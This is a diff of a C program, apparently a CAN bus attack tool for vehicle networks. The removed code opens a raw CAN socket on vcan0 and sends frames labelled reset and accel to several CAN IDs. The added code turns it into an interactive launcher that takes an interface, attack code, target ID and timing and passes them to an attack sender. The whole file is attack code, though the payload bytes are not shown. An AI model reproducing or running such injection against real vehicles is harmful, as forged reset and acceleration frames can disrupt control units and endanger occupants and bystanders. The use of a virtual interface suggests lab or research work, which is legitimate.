@@ -1,42 +1,30 @@
-#include "all-headrs.h"
+#include "all_headers.h"
 
+/*================================================================
+main
+==================================================================*/
 
-int attack_tool() {
-    int s;
-    struct sockaddr_can addr;
-    struct ifreq ifr;
+int main() {
+    char interface[IFNAMSIZ];
+    int attack_code;
+    int canid;
+    int time_diff;
 
-    // 소켓 생성
-    if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
-        perror("Socket creation error");
-        return 1;
-    }
+    //get user input
+    printf("Enter CAN interface name (e.g., vcan0): ");
+    scanf("%s", interface);
+    
+    printf("Enter attack code (1 or 2): ");
+    scanf("%d", &attack_code);
 
-    // 인터페이스 이름 설정 (vcan0 또는 실제 CAN 인터페이스 이름으로 변경)
-    strcpy(ifr.ifr_name, "vcan0");
-    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
-        perror("SIOCGIFINDEX error");
-        return 1;
-    }
+    printf("Enter CAN ID (in hexadecimal, e.g., 0x100): ");
+    scanf("%x", &canid);
 
-    // 소켓 주소 설정
-    addr.can_family = AF_CAN;
-    addr.can_ifindex = ifr.ifr_ifindex;
+    printf("Enter time difference (in ms): ");
+    scanf("%d", &time_diff);
 
-    // 소켓 바인딩
-    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        perror("Socket binding error");
-        return 1;
-    }
-
-    // 원하는 페이로드 선택하여 전송
-    send_can_packet(s, &addr, msq.reset1, sizeof(msq.reset1), 0x100);
-    send_can_packet(s, &addr, msq.reset2, sizeof(msq.reset2), 0x101);
-    send_can_packet(s, &addr, msq.accel1, sizeof(msq.accel1), 0x200);
-    send_can_packet(s, &addr, msq.accel2, sizeof(msq.accel2), 0x201);
-
-    // 소켓 닫기
-    close(s);
+    //call attack_packet_sender
+    attack_packet_sender(interface, attack_code, canid, time_diff);
 
     return 0;
 }
